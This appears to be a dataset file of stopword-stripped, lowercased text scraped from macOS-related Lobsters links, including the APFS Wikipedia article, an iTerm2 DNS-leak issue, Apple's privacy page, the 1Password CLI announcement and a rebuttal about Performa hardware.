383,Lobsters,mac,Apple macOS,Apple File System - Wikipedia,https://en.wikipedia.org/wiki/Apple_File_System,apple file system wikipedia,apple filing protocol developer apple inc io macos partition identifier gpt btree eib unicode n file system permission acls transparent encryption copyonwrite operating system macos ipados io tvos watchos proprietary file system macos high sierra io tvos watchos ipados apple inc core problem hf flash solidstate drive encryption edit apple developer conference hf io macos inode trim command delta extent data deduplication edit snapshot edit full disk encryption singlekey metadata edit inode number edit checksum data integrity edit system crash redirectonwrite edit lzfse lempelziv edit volume edit nonvolatile randomaccess memory hard link time machine inode hard disk drive seek edit edit macos high sierra filevault macos mojave fusion drive macos sierra unicode normalization time machine edit io tvos watchos hfsx edit paragon software group software development kit bsd license open source gnu lesser general public license debian ubuntu filesystem userspace edit edit doi issn volume format comparison apple file system guide frequently asked question compression apfs apple file system guide feature tvos apple upgrading million io device new modern file system today verge vox medium archived apple file system scale apple watch mac replace hf apple insider archived digging apfs apple new file system ar technica uk apple file system apfs announced scale apple watch mac pro focus encryption archived new file system spotted macos sierra updated ar technica condé nast archived apple release io find airpods apfs app store review tweak macrumors archived apple file system reference updating iphone give one major benefit joecouk archived apfs detail data integrity archived enable transparent compression apfs archived copy archived link zfs developer analysis good bad apple new apfs file system archived wayback machine apple apfs wo nt last year zdnet apfs detail overview zfs developer analysis good bad apple new apfs file system ar technica disk use time machine analysis apfs enumeration performance rotational hard drive uh oh unified log high sierra show plaintext password apfs encrypted external volume via disk utilityapp prepare apfs macos high sierra macos mojave ar technica review using macos high sierra o installer startosinstall tool avoid apfs conversion apfs bag byte filename apfs currently unusable nonenglish language eclectic light company archived wayback machine format drive apfs file system macos sierra archived jakepetroulesfilesystem diskwarrior apple file system apfs paragon software group release free paragon apfs sdk community edition software developer oems forensic expert github libyallibfsapfs mount macos apfs disk volume linux github linuxapfslinuxapfsoot apfs module linux outoftree repository edit,confused apple file service afs service implementing apple filing protocol afp apfsdeveloper apple incfull nameapple file systemintroducedmarch io september macos io macos gpt structuresdirectory contentsbtree limitsmax file eib byte max number allowed character filenamesunicode encoded featuresdates recordedaccess attribute modified content modified createddate rangejanuary july date n file system permissionsunix permission aclstransparent compressionpartial decmpfs transparent encryptionyes copyonwriteyes othersupported operating systemsmacos ipados io tvos watchos apple file system apfs proprietary file system macos high sierra later io later tvos later watchos later version ipados developed deployed apple inc aim fix core problem hf also called mac o extended apfs predecessor operating system apple file system optimized flash solidstate drive storage primary focus encryption history edit apple file system announced apple developer conference wwdc june replacement hf use since apfs released io device march release io macos device september release macos apple released partial specification apfs september supported readonly access apple file system unencrypted nonfusion storage device specification software encryption documented later file system used device relatively small large amount storage us inode number allows secure storage apfs code like hf code us trim command better space management performance may increase readwrite speed io macos well space io device due way apfs calculates available data clone allow operating system make efficient file copy volume without occupying additional storage space change cloned file saved delta extent reducing storage space required document revision copy however interface mark two copy file clone type data deduplication snapshot edit apple file system support snapshot creating pointintime readonly instance file system encryption edit apple file system natively support full disk encryption file encryption following option encryption singlekey encryption multikey encryption file encrypted separate key metadata encrypted different key increased maximum number file edit apfs support inode number supporting quintillion file single volume data integrity edit apple file system us checksum ensure data integrity metadata crash protection edit apple file system designed avoid metadata corruption caused system crash instead overwriting existing metadata record place writes entirely new record point new one release old one approach known redirectonwrite avoids corrupted record containing partial old partial new data caused crash occurs update also avoids write change twice happens hf journaled file system change written first journal catalog file compression edit apfs support transparent compression individual file using deflate zlib lzvn libfastcompression lzfse three lempelzivtype algorithm feature inherited hf implemented applefscompression decmpfs system using resource fork extended attribute hf transparency broken tool use decmpfswrapped routine space sharing edit apfs add ability multiple logical drive referred volume container free space available volume container block device limitation edit apple file system provide checksum user data also take advantage byteaddressable nonvolatile randomaccess memory unlike version hf since leopard apfs support hard link directory line many modern file system time machine still relies apfs yet option backup volume macos catalina enumerating file inode metadata general much slower apfs located hard disk drive instead storing metadata fixed location like hf apfs store alongside actual file data fragmentation metadata mean seek performed listing file acceptable ssds hdds security issue edit march apfs driver high sierra found bug cause disk encryption password logged plaintext support edit since macos high sierra device flash storage automatically converted apfs filevault volume also converted macos mojave fusion drive hard disk drive also upgraded installation primary user interface upgrade present option opt conversion device formatted high sierra version apfs readable previous version macos user disable apfs conversion using installer startosinstall utility command line passing converttoapfs experimental version apfs limitation available macos sierra command line diskutil utility among limitation perform unicode normalization hf leading problem language english drive formatted sierra version apfs may also compatible future version macos final version apfs sierra version apfs used time machine filevault volume fusion drive io tvos watchos edit io tvos watchos convert existing hfsx file system apfs compatible device thirdparty utility edit despite ubiquity apfs volume today mac format introduction thirdparty repair utility continue notable limitation supporting apfs volume due apple delayed release complete documentation according alsoft maker diskwarrior apple release partial apfs format documentation delayed creation version diskwarrior safely rebuild apfs disk competing product including micromat techtool prosoft drive genius expected increase apfs support well paragon software group published software development kit bsd license support readonly access apfs drive independent readonly open source implementation joachim metz libfsapfs released gnu lesser general public license packaged debian ubuntu software repository commandline tool expose normal filesystem driver interface filesystem userspace fuse driver linux called apfsfuse readonly access apfs linux project working integrate apfs support linux kernel see also edit reference edit b hansen kh toolan f september decoding apfs file system digital investigation issn b c e f volume format comparison apple developer retrieved may b c apple file system guide frequently asked question retrieved may bertin rené compression apfs github retrieved february b c apple inc apple file system guide feature retrieved may tvos new tvos apple inc b c warren tom march apple upgrading million io device new modern file system today verge vox medium archived original march retrieved march roger fingas june apple file system scale apple watch mac replace hf apple insider archived original july b c hutchinson lee june digging apfs apple new file system ar technica uk retrieved june b weintraub seth june apple file system apfs announced scale apple watch mac pro focus encryption archived original march retrieved march b hutchinson lee june new file system spotted macos sierra updated ar technica condé nast archived original march retrieved march b clover juli march apple release io find airpods apfs app store review tweak macrumors archived original march retrieved march apple file system reference pdf apple developer alan loughnane updating iphone give one major benefit joecouk archived original may b adam leventhal june apfs detail data integrity archived original june søgaard jens k enable transparent compression apfs ask different retrieved november archived copy pdf archived pdf original october retrieved june maint archived copy title link zfs developer analysis good bad apple new apfs file system archived february wayback machine robin harris june apple apfs wo nt last year zdnet adam leventhal june apfs detail overview retrieved october b leventhal adam h june zfs developer analysis good bad apple new apfs file system ar technica apfs right incompatible time machine due lack directory hard link fairly disgusting implementation likely contributes time machine questionable reliability disk use time machine retrieved december analysis apfs enumeration performance rotational hard drive carbon copy cloner retrieved january uh oh unified log high sierra show plaintext password apfs encrypted external volume via disk utilityapp retrieved november b prepare apfs macos high sierra applecom september retrieved september macos mojave ar technica review arstechnicacom september retrieved december trouton rich september using macos high sierra o installer startosinstall tool avoid apfs conversion der flounder retrieved january apfs bag byte filename apfs currently unusable nonenglish language eclectic light company archived june wayback machine format drive apfs file system macos sierra archived original october retrieved october jakepetroulesfilesystem github retrieved march diskwarrior apple file system apfs retrieved june paragon software group release free paragon apfs sdk community edition software developer oems forensic expert paragon software group github libyallibfsapfs github november library tool access apple file system apfs ross alistair february mount macos apfs disk volume linux ultimate linux newbie guide github linuxapfslinuxapfsoot apfs module linux outoftree repository github apfs linux march external link edit
384,Lobsters,mac,Apple macOS,iTerm2: Please disable 'Perform DNS lookups to check if URLs are valid,https://gitlab.com/gnachman/iterm2/issues/6050,please disable perform dns lookup check url valid,closed closed,thanks filing issue please answer question help detailed step reproduce problem install iterm hover thing remotely resemble url touch cmd watch iterm leak thing plain text dns happened iterm sent various thing including password plain text isp dns server happened iterm done monitored dns traffic kept noticing lookup made sense thing printed terminal initially blamed bashcompletion noticed also happened remote ssh session became obvious blame coworker found closed closed immediately disabled feature feature default terrible security privacy risk please disable default personally never even noticed blue v white clickable link suggests usability reduced much setting feature disabled default stress impact act selecting text cmdcing copy easy trigger password example generate using pwgen
385,Lobsters,mac,Apple macOS,Our Approach to Privacy - Apple,https://www.apple.com/privacy/approach-to-privacy/,approach privacy apple,siri ondevice suggestion random identifier ondevice processing siri dictation improving siri dictation suggestion search safari,siri siri designed much learning possible offline right device search request associated random identifier long string letter number apple id ondevice suggestion ask siri read search information device message note siri provides many type suggestion including safari map personal information kept device rather sent apple server siri suggestion quicktype keyboard feature made possible appledeveloped neural network language process run directly device random identifier although apple attempt much possible device use certain feature like making voice request siri searching spotlight safari realtime input needed apple server send information server protect privacy using random identifier apple id information like location may sent apple improve accuracy response allow disable location service time ondevice processing even request come apple server keep much personal information device example ask siri read one message siri read message without sending apple server siri dictation longer use siri dictation better understand improve help siri dictation recognize pronunciation provide better response certain information name contact music book podcasts enjoy sent apple server using encrypted protocol siri dictation associate information apple id rather random devicegenerated identifier reset identifier time turning siri dictation back effectively restarting relationship turn siri dictation apple delete siri data including request history associated siri identifier learning process start improving siri dictation default apple retain audio recording siri dictation interaction computergenerated transcript used improve siri dictation opt help siri improve allowing apple store review audio siri dictation interaction opt time audio sample associated random identifier instead apple id addition delete siri dictation request including audio recording computergenerated transcript associated random identifier apple server time note request six month old small sample request reviewed may deleted longer associated random identifier suggestion search safari use safari search io ipados spotlight macos search sent apple server along contextual information like location action taken search session provide relevant suggestion information associated random identifier apple id search location connected personally suggestion search safari new random identifier generated every minute precise location never shared server instead approximate location device sent using location fuzzing choose disable suggestion search safari choose disable locationbased suggestion apple still use ip address determine general location make suggestion relevant
386,Lobsters,mac,Apple macOS,Apple's Object Support Library,https://web.archive.org/web/19970615145957/http://www.devworld.apple.com/dev/technotes/tn/tn1095.html,apple object support library,known bug osl technote weaklinking code fragment managerbased shared library,beginning osl osl first released static library aeobjectsupportlibo statically linked application supported osa object model still case classic application release power macintosh accompanying cfm shared library application model decide shared library version osl objectsupportlib rather file provided powerpcnative application would allow native application take advantage shared library application model osl powerpc shared library released version included first power macintosh system software version applescript sdk version currently still available mac o sdk cd version osl number known bug handling whose clause bug listed known bug osl section technote first shared library introduced first osl shared library problem osl written pascal powerpc pascal compiler contained small powerpcnative library loaded code resource containing osl loading done properly objectsupportlib resource file often ended middle application resource chain problem worked around system forcing finder load osl started thus forcing osl resource file located system harm workaround masked problem system version problem still earlier system version introduction power macintosh work began convert osl source code pascal c conversion needed order provide shared library containing powerpc code converted fat osl released version included eto cdrom release recently number problem however version osl worst gestalt selector installed version installed version prevented application testing gestalt selector detecting presence osl shared library note gestalt selector best method detecting presence osl decision made early development code fragment model liability using gestalt yet well understood preferred method would developer compare symbol library kunresolvedcfragsymboladdress detail process see technote weaklinking code fragment managerbased shared library major problem version osl number bug code handled whose clause resolution addition previously mentioned bug would cause application return incorrect result andor error message presented valid request missing gestalt selector prevented version use whose clause resolution bug discovered much later
387,Lobsters,mac,Apple macOS,Every Major Advertising Group Is Blasting Apple for Blocking Cookies in the Safari Browser,http://www.adweek.com/digital/every-major-advertising-group-is-blasting-apple-for-blocking-cookies-in-the-safari-browser/,every major advertising group blasting apple blocking cooky safari browser,update,biggest advertising organization say apple sabotage current economic model internet plan integrate cookieblocking technology new version safarisix trade interactive advertising bureau american advertising federation association national advertiser two deeply concerned apple plan release version internet browser override replaces user cookie preference set applecontrolled standard feature called intelligent tracking prevention limit advertiser website track user across internet putting place limit ad retargetingin open letter expected published afternoon group describe new standard opaque arbitrary warning change could affect infrastructure modern internet largely relies consistent standard across website group say feature also hurt user experience making advertising generic le timely useful apple unilateral heavyhanded approach bad consumer choice bad adsupported online content service consumer love according copy letter obtained adweek morning blocking cooky manner drive wedge brand customer make advertising generic le timely useful put simply machinedriven cookie choice represent user choice represent browsermanufacturer choice course digital advertising world lot lose hypertargeting becomes diluted according emarketer report released march digital ad spending u expected reach billion nearly percent last yearwhen apple first announced limitation crosswebsite tracking june company said change meant improve trust user explaining user feel trust broken tracked privacysensitive data web activity acquired purpose never agreed statement emailed adweek regarding industry group letter apple reiterated importance consumer privacy also pointing safari first browser block thirdparty cooky default even introduction intelligent tracking prevention according apple intelligent tracking prevention still allow tracking website person visit ad tracking technology become pervasive possible ad tracking company recreate majority person web browsing history according apple spokesperson information collected without permission used ad retargeting ad follow people around internet safari update detect eliminate cooky data block actual ad google however already testing ad blocker chrome could released broadly next year trade group criticized move apple industry expert said latest feature welcome addition intelligent tracking prevention us machine learning block company relationship consumer employing crosssite tracking workarounds said jason kint ceo digital content next online publishing group may perfect solution applaud apple effort closely align context consumer expectation full copy letter also signed data marketing association network advertising initiative september open letter digital advertising community undersigned organization leading trade association digital advertising marketing industry collectively representing thousand company responsibly participate shape today digital landscape million consumer serve deeply concerned safari browser update apple plan release override replaces existing usercontrolled cookie preference apple set opaque arbitrary standard cookie handling safari new intelligent tracking prevention would change rule cooky set recognized browser addition blocking thirdparty cooky ie set domain one visited current version safari new functionality would create set haphazard rule use firstparty cooky ie set domain user chosen visit block functionality purge user browser without notice choice infrastructure modern internet depends consistent generally applicable standard cooky digital company innovate build content service advertising personalized user remember visit apple safari move break standard replaces amorphous set shifting rule hurt user experience sabotage economic model internet apple unilateral heavyhanded approach bad consumer choice bad adsupported online content service consumer love blocking cooky manner drive wedge brand customer make advertising generic le timely useful put simply machinedriven cookie choice represent user choice represent browsermanufacturer choice organization devoted innovation growth consumer economy actively oppose action like company harm consumer distorting digital advertising ecosystem undermining operation strongly encourage apple rethink plan impose cookie standard risk disrupting valuable digital advertising ecosystem fund much today digital content service signed american association advertising agency american advertising federation aaf association national advertiser ana data marketing association dma interactive advertising bureau iab network advertising initiative nai update story updated include statement apple regarding ad industry group letter
388,Lobsters,mac,Apple macOS,MacOS 10.12.6 Source,https://opensource.apple.com/release/macos-10126.html,macos source,,
390,Lobsters,mac,Apple macOS,Apple Special Event for September 2017,https://www.apple.com/apple-events/september-2017/,apple special event september,,love watch episode especially one steve job work great issue one request go back much farther please seen every single one would really like watch older one hd want see much steve legendary keynote
391,Lobsters,mac,Apple macOS,How I connected the PowerBop to the Internet,http://www.journaldulapin.com/2014/09/14/how-i-connect-the-powerbop-to-the-internet/,connected powerbop internet,en français powerbop partager linformation avec vos amis,follow twitter saw finally got powerbop even connected internet powerbop computer proposed apple france telecom talked device could connect france telecom bibop network en français bibop network one first mobile phone network early launched paris strasbourg lille network consisted set base station limited scope placed street make simple bibop network pretty close dect technology manually register public base station could make receive call close base station transition one base station another planned base station location indicated sticker light pole building paris still find sticker question even network longer exists interestingly long concept femtocell france telecom sold private base station use home base plugged telephone network could use phone outside public base station home private base station france telecom others proposed various model base station telephone come back point later powerbop powerbop powerbop powerbook modified france telecom basically internal floppy drive replaced bibop module external floppy drive powerbook duo powerbook proposed powerbop pretty rare hundred copy produced antenna height macbook air connecting powerbop struggle first reinstall data backup disc hunt hard time finally got readytogo machine realized base station working could connect powerbop bibop phone get dial tone find second functional base station realized modem obviously toasted indeed powerbop bibop module stopped operating testing found second powerbop worked realized hard drive model dead audibly suffering first test died latter fortunately hard drive stock reinstalled machine second time accompanied gentle sound floppy bibop second step connect internet generally use line simulator either airport modem raspberry pi case impossible connection made powerbop module could find good reason fot work external expressmodem powerbop module minor annoyance sound modem extremely loud powerbop us external expressmodem modem managed partially mac software command mute sound work friend neighbor later colleague may cursed went real line conventional fai worked connected next issue browser browser old system indeed unable load recent page filled javascript nonsupported image redirects work used disreputable working website rottencom connection made baud kb although theory reach baud also struggled badly configure mac ppp since modem initialization string added automatically try several string finding right one type modem fact slow compatible nothing oddly enough genius looked funny came explain could apple store partager linformation avec vos amis related
392,Lobsters,mac,Apple macOS,1Password command-line tool public beta,https://blog.agilebits.com/2017/09/06/announcing-the-1password-command-line-tool-public-beta/,commandline tool public beta,introducing commandline tool pro plan rock robot rock solid get nix linux chrome o next,agilebits working hard last month bring power user developer administrator powerful way interact proud announce something fit bill called commandline tool wait see build let take opportunity walk exciting potentialintroducing oppassword apps available every platform always dependency graphical interface available two character opthe commandline tool make account accessible entirely command line simple op signin securely authenticate service give access wide range capability getting usernames password item op get item openproxy jq detailsfields select designation password value genuineadoptpencilcoaster creating new item vault op create item login cat awsjson op encode title aws uuid vaultuuid op create vault devops uuid working document op create document devopspdf vaultdevops tagsarchitecture uuid vaultuuid team administrator also manage user shared vault without leaving terminal op suspend john acmecorpcomone frequent request receive team customer ability export activity log pro plan op list event make easy ingest activity data application choosing splunk kibana papertrail tool op output json simple work withbut build tool solve specific request flexible enough handle use case even thought possibility endless know come something rock robot rock solid command structure similar tool already use providing easy integration workflow automated system access secure credential without ever storing plaintext agilebits example using op last month part automated build system super useful fetching secure key token required building deploying secure op signin script fetch appropriate signing key shared vault automatically sign new buildsthe tool written ground battletested go programming language used build service every client encryption decryption done machine locally ensuring highest level security best practice come expect entire family appsget nix onour dream late filled penguin two week ago shared treat linux user week becomes feast might already tried linux chrome o know really make developer salivate cli download op macos linux freebsd openbsd netbsd arm architecture oh window friend play next excited everything need get started highly value thought people using beta real world continue improving tool work toward stable release eventually open source please bear mind may breaking change line happy work resolve issue look forward working together create truly useful powerful tool without younow get ready pipe grep cat sed hicksgopherwan kenobi
393,Lobsters,mac,Apple macOS,My wonderful world of macOS,https://github.com/nikitavoloboev/my-mac-os,wonderful world macos,wonderful world macos application lot apps dotfiles io setup telegram group extensive wiki everything know changing theme km macro applescript preferscolorscheme productivity karabiner keyboard remapping flexible task manager password manager context window switcher cleanshot create annotate screenshotsrecordings popclip io like mouse text selection popover popmaker reeder r reeder inoreader blog follow notion allinone workspace linear issue tracker code iterm terminal emulator gitupdate dash api documentation browser alfred workflow paw http client neovim text editor social spark email client tweetbot twitter client design figma design tool sip collect organize share color pixelsnap measure everything screen music spotify music streaming lot great music alfred workflow like video iina video player mpv browser vimari wipr safari native content blocking api command line apps brew tool use system interesting cli tool exa ripgrep fzf fd watchexec bat jq git curl youtubedl tmux direnv htop httpie rq pandoc trash vtop gotop howdoi asciinema tldr imgcat cat screenfetch hugo reflex modd yarn hub xsv pv mcli pgcli ma loc alfred neofetch licenseup piknik bench ghq npx devd wifipassword fkill ran launchpad similar repository similar setup related contributing similar setup say thank github project,wonderful world macos list application tool make macos experience even amazing light appearance prefer use light theme make text readable day natural light around dark appearance apps one desktop since delay switching macos multiple desktop dock hidden desktop background dynamic application use lot apps mac list favorite tool description use also share dotfiles together io setup made telegram group discus thing macosios extensive wiki share everything know apps described wiki linked changing theme made km macro applescript switch lightdark macos appearance appearance switched theme get updated accordingly apps notion discord sublime merge sadly still nt let change theme according o setting site nt use preferscolorscheme cs feature change look site light dark automatically hope change future productivity karabiner keyboard remapping flexible task manager password manager read lot pdfs like book research paper like like let multiple tab sepiadark mode nice annotation tool great search context window switcher allows fuzzy search currently active window apps open directly via karabiner time great fuzzy search open window come natively macos started love using exploring searching wikipedia incredibly fast make search give quick autosuggestion query type select arrow cleanshot create annotate screenshotsrecordings make screenshot allows quick edits arrow text blurring popclip io like mouse text selection popover brings quick menu whenever text selected number quick action like searching selected text google youtube copy text extension activated look everything use come default popclip except youtube extension download used popmaker tool create web search extension reeder r reeder app use keep r feed use r follow favorite blog stay date new podcast episode even track software release use inoreader sync blog follow phone mac reeder look like torrent client use minimal ui powerful feature need notion allinone workspace linear issue tracker love using working team bigger project code iterm terminal emulator use version control project work use together gitupdate frictionlessly manage update dash api documentation browser allows download docset might want use search method class anything need quickly come amazing alfred workflow simplify process searching right thing paw http client use quickly make http request test api endpoint neovim text editor social spark email client love smartly categorizes email category approach email task gtd style keeping email inbox close time tweetbot twitter client design figma design tool sip collect organize share color great color picker use collect favorite color color scheme pixelsnap measure everything screen use quickly get measurement object distance element music spotify music streaming found lot great music app phenomenal alfred workflow make using application absolute joy quickly finding artist song want listen instantly adding song playing like playlist playlist want seeing song artist video iina video player open source alternative vlc built specifically macos based mpv modern native look vlc browser safari extension vimari add custom layer keybinds customize personalize browsing experience like hinting moving tab wipr ad content blocker us safari native content blocking api phenomenal password manager extension give seamless interaction browser command line apps use brew package manager install tool use system curate list interesting cli tool one love use exa replacement l written rust ripgrep search text pattern fast fzf commandline fuzzy finder fd simple fast userfriendly alternative find watchexec executes command response file modification bat cat clone wing deploy infinitely scalable serverless apps apis site second aws jq json processor git version control curl transfer data server youtubedl download video youtube video site tmux terminal multiplexer direnv environment switcher shell htop interactive textmode process viewer unix system httpie http client rq tool record analysis transformation pandoc universal markup converter trash move file folder trash vtop graphical activity monitor gotop terminal based graphical activity monitor inspired gtop vtop howdoi instant coding answer asciinema terminal session recorder tldr simplified communitydriven man page imgcat like cat image screenfetch fetch systemtheme information terminal hugo fast flexible static site generator reflex run command file change modd flexible tool responding file system change real time global deployment served yarn fast reliable secure dependency management hub github wrapper xsv fast csv command line toolkit written rust pv pipe viewer mcli useful utils macos pgcli postgres cli autocompletion syntax highlighting ma cli mac app store loc count line code quickly alfred manage gobased alfred workflow neofetch system information tool licenseup create license quickly project piknik copypaste anything network bench commandline benchmark tool ghq manage remote repository clone npx execute npm package binary devd local webserver developer wifipassword get password wifi fkill fabulously kill process ran simple static web server written go launchpad found interesting also similar repository going application use ioswatchos well use similar setup find setup people take idea inspiration related contributing shared similar personal setup window linux anything else add similar setup section love finding new awesome tool apps favorite tool app think missed please say thank support github look project shared
394,Lobsters,mac,Apple macOS,iOS and macOS: What does the future hold?,http://www.macworld.com/article/3219695/ios/future-of-ios-and-macos.html,io macos future hold,danger mac o x getting old tweet steve troughtonsmith google nextgeneration operating system project every decade plow ahead front lean io replace macos apple o o theseus io come sort different device affiliate link policy,easy get focused detail present miss obvious question future john siracusa wrote danger mac o x getting old operating system around five wrong apple would need address major shortcoming operating system long termso io riding high serving basis pretty much every major apple platform mac hard imagine come next yet tweet steve troughtonsmith made eye pop open linking fascinating ar technica story fuschia google nextgeneration operating system project troughtonsmith wrote far enough age mobile big player designing os follow itsurprised apple crazy think apple would want replace io macos something new unified postxnu kernel run io macos postbsd unix underpinnings io macos replace macos okay played game mac changed chip architecture every decade year macosos x classic mac o lasted amount time io comparatively young still year old built top mac o x base perhaps time coming sooner think perhaps let look apple longterm o choice plow ahead front scenario apple continues maintain two separate related base operating system macos io io continues receive lot attention macos also get major new feature especially one synergistic addition io lot extra work two totally separate operating system leaving aside io derivative run apple watch apple tv homepod mac business apple want abandon io going replace left steady state applelean io replace macos people would argue current state affair sure still get love annual true difference first two scenario mostly apple ultimate goal io apple building io especially ipad operating system powerful enough outright replace macos someone us io get real work done think apple still got long way go io could feel comfortable making io desktop laptop shutting production mac company could get made concerted effortapple o way apple go would continue updating io macos annually pull resource project instead begin building foundation entirely new operating system one run device small apple watch airpods large imac mac pro operating system take best io ditch suggests replacing xnu kernel bsd unix something new new single operating system would basis future apple product distinction mac io would drop awaythe o theseusmy guess apple stomach complicated operatingsystem migration especially io app store well io proven remarkably adaptable last year apple shown preference replace part operating system bit bit rather chucking everything wholesale io device run different filesystem ran last year apple programming language future swift coexists objectivec language apple inherited next seems prefer invisible subtle slow technology transition whenever possible seems apple would rather keep making change behind scene io whenever possible keeping relevant modern rather making clean break confuses market make life hard developer potentially slows momentum iphone app store appleif replacing io piece piece future leave macos believer io come sort different device future mac remain alive kicking probably long anyone want use gratefulthe continued existence mac give apple powerful come io development something io market user type serve apple point mac declare solutionthis seems current state affair apple investing io swapping bit piece go allowing grow something embarking crash course build mac replacement macos keep hanging around gaining new feature urgency exciting certainly could turn wrong sometimes slow steady really win race note purchase something clicking link article may earn small commission read affiliate link policy detail
395,Lobsters,mac,Apple macOS,Exploitations of Uninitialized Uses on macOS Sierra,https://www.usenix.org/system/files/conference/woot17/woot17-paper-xu.pdf,exploitation uninitialized us macos sierra,,obj length filter flatedecode stream k ܖ p g k
396,Lobsters,mac,Apple macOS,Oral History of Avie Tevanian - Session 1,https://www.youtube.com/watch?v=vwCdKU9uYnE,oral history avie tevanian session,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature oral history avie tevanian session youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature oral history avie tevanian session youtube
397,Lobsters,mac,Apple macOS,We need to document macOS,https://eclecticlight.co/2017/08/13/last-week-on-my-mac-we-need-to-document-macos/,need document macos,like,spend inordinate amount time searching information macos whether researching answer section macformat magazine trying solve problem also daily reminded apple wholesale failure provide consistent complete documentation flagship product never used case day classic mac o print publishing growing result mac apple published exemplary series book banner inside macintosh volume still pile desk despite mac o undergoing quite rapid evolution system six year later two year later know many technical author employed apple time suspect far higher proportion total staff since mac o x o x macos become immeasurably expansive complex many people use mac need much support yet apple documentation user supporting user dried even look guide developer substantially revised several year many completely kilter el capitan sierra easy blame user making best use information available recommend everyone contact apple support read answer relentless stream question user example realise recharge magic trackpad never knew launch app dock manage photo library apple change thing without explaining new system properly without providing u suitable new tool one best shocking example introduction new unified log sierra almost year later apple provided u accessible utility browse past entry new log guide use interpret new log entry useful information contained man page command tool log much information available outdated incorrect time launchd second importance kernel controlled orchestrated service supplied macos large proportion scheduled dispatched two system da ct barely even mentioned apple latest developer documentation busy part macos even appear name afraid glimmer light apple intends change situation indeed next major release macos making way last beta release good chance soon get even worse contend foible apfs many change sitting one way going get better documentation create far open collaborative project developed great deal valuable software attracted great many developer extremely talented real success opensourcing collaborativelydeveloping software part computer user need open source project proud user documentation order magnitude better anything provided apple macos mac user need open collaborative project document macos happy help make happen donate relevant material blog joint effort take u dark back light like like loading related
398,Lobsters,mac,Apple macOS,The Mythical Road Apple,http://www.taylordesign.net/classic-macintosh/the-mythical-road-apple/,mythical road apple,revisiting past look back series lowendmaccom power mac performa road apple performa power mac issue background memory bottleneck implemented powerpc architecture evaluating memory path macbench macbench score advanced hardware issue series motherboard motherboard northbridgesouthbridge design evaluating motherboard conflicting io multitasking slow internet handling modem compromise adrian winnard user emailed stem cabling vram cache road apple quadra important mac,recently came across revisiting past look back series chris carson lowendmaccom article series power macintosh performa computer apple shipped mid based motherboard processor model number range often referred series article portrays series rather poor light claiming crippled incredibly bizarre surprised read used performa couple year never thought bad slow computer curious line got poor reputation followed link read power mac performa road apple dan knight performa power mac issue scott l barber immersed macintosh programming late familiar powerpc architecture apple motherboard design know source information behind article everything say wrong bangyourheadonthekeyboard wrong think low end mac great resource intend disrespect towards author article source myth confusion series rebuttal focus quote mr barber piece appears foundation later article link important reference background first model used powerpc processor onchip cache data instruction cache small apple emulator work efficiently even powerpc native apps affected large portion o still case used later model onchip cache cache difference everything say reference applies well memory bottleneck mean home user simple memory path bit wide processor us command take four processor cycle instruction completely sent processor implemented powerpc architecture instruction address general purpose register could loaded single read bus floating point register could treated single precision double precision value put simply need additional cycle load command bus therefore take time longer process anything value superscalar processor independent load store unit lsu mean unit could work data register lsu accessed main memory loading value would take time bus would neither pause require extra cycle compose value load time given article incorrect dram access timing beyond scope article likely address load time later article lsu limited floating point value transfer could move two instruction integer value could also perform burst transfer involved multiple data bus access streamlined way mr barber specific claim false general claim would faster bus true much faster would depend large part presence speed cache without one difference would somewhat le due dram latency cache difference would much smaller model cache bus clocked processor speed impact memory path minimal evaluating memory path standard benchmarking tool time macbench used real world algorithm included good mix memory io test affected data bus cache like real program macbench score therefore give u reliable indication overall performance way estimate impact bus modelcpucpu speedram bus widthmacbench cpu score performa power mac power mac three mac close processor memory bus speed cache integer unit little faster integer unit close get equalizing factor given equipment apple shipped see score fall shy close specific algorithm might see le impact think fair say overall speed penalty bus roughly versus based mac far cry even mr barber claimed mac scored well benchmark yet absolutely terrible real world may true based model due emulation issue reason doubt predictive value come powerpc code advanced hardware issue series advanced hardware issue section mr barber described believed motherboard design series highlight include cpu bus split two bus main memory one half bus cpu forced act bridge two bus component arranged fill bit bus described conflicting overlap range mismatched component speed derived one clock signal multiplexer buffer mr barber stressed belief multiplexing handled via software put fine point everything mr barber said section false motherboard would never work begin split powerpc data bus manner described processor bus going use data pin half line went ram half went somewhere else transaction would immediately cause hard crash mode one single bus split bus important bit data bus split device order fill bus component connected bit personal computer data bus interfere address mapped managed strict hardware enforced arbitration protocol two component drive bus time output would connected leading electrical damage article description mind let look actual design documented apple motherboard far bizarre compromised motherboard similar northbridgesouthbridge design processor external cache rom shared bus clocked speed custom chip capella linked bus bus running mhz board mhz cpu mhz later board faster processor capella provided translation bus arbitration bus connected memory controller graphic controller making capella similar northbridge chip another custom chip primetime ii linked bus hierarchy mhz bus bus connected sound adb floppy disk lc pd slot dictated clock speed protocol primetime ii similar southbridge chip io buffer clock hardware support multiplexing device bus important detail note scsi ide serial port io handled via controller embedded asic bus ide controller io buffer board network controller comm slot proprietary expansion slot evaluating motherboard single thing see impacted performance favor lower cost placing memory controller ram bus thanks cache enabled apple use existing component design small speed penalty given higher clock speed lower pricing model fair trade apple could reduced cost capella setting external data bus mode instead retained bus close processor speed cache rom designed capella could continue execute instruction cache rom bus busy mr barber article implies multiple bus speed compromised mac fact personal computer era today multiple bus reason allows motherboard mix slower faster chip without compromising fast one conflicting io multitasking mr barber gave numerous example device conflicting device typing v audio networking v graphic blamed overlapping bit explained data bus bit split device device could simply talk block hardware level mean would never experience problem like listed mac o classic code cooperatively scheduled busy errant code could retain control cpu block process every classic mac could experience paused dropped typing broken audio screen redraw pause general unresponsiveness heavy load window suffered issue type problem eliminated modern o architecture using home used various power mac work recall better worse peer came issue recall mr barber example mean never occurred anyone would due software issue motherboard slow internet handling one biggest complaint series slow internet handling one thing looking chart data either port ethernet controller must pas processor get memory processed sent ide controller cache saving interpreted graphic display developer note indicates scsi serial port controller direct memory access dma specify whether component dma would guess component required cpu manage io nothing multiple bus component either dma cpu must manage io even cpu relay traffic ethernet card would impacted internet handling mbps card downloading full speed would create bus traffic mb cpu ram bus could carry mb mb mb respectively relaying data would require little cpu time impact would human observable model noticeably slow internet would due cache legacy code recall handled internet power mac like modem compromise apple scrimped port controller hardware handshaking port therefore external modem faster baud useless scc serial port controller embedded asic developer note document handshake pin specifically note gpi pin port connected controller available use gpi pin missing earlier entry level mac limit transfer speed adrian winnard test confirm later model supported speed greater baud remember removing internal modem replacing external modem consistently connected near maximum speed user emailed low end mac say thing possible bug early hardware software broke handshaking first model also possible confusion stem cabling whatever cause behind user achieving maximum serial port speed apple leave serial port controller hardware handshaking model could saved money vram cache neither video ram cache upgradable case 